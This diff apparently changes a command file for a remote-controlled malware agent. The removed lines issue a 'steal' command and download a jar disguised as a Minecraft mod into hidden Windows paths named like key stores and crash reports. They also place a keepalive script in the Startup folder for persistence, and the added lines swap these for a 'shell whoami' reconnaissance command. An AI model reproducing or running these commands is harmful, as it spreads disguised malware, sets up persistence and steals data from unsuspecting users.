@@ -1,8 +1,3 @@
 # my commands
-version: 3.2
-steal
-mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Protect\syskeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/keepalive.cmd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keepalive.cmd
+version: 3.3
+shell whoami
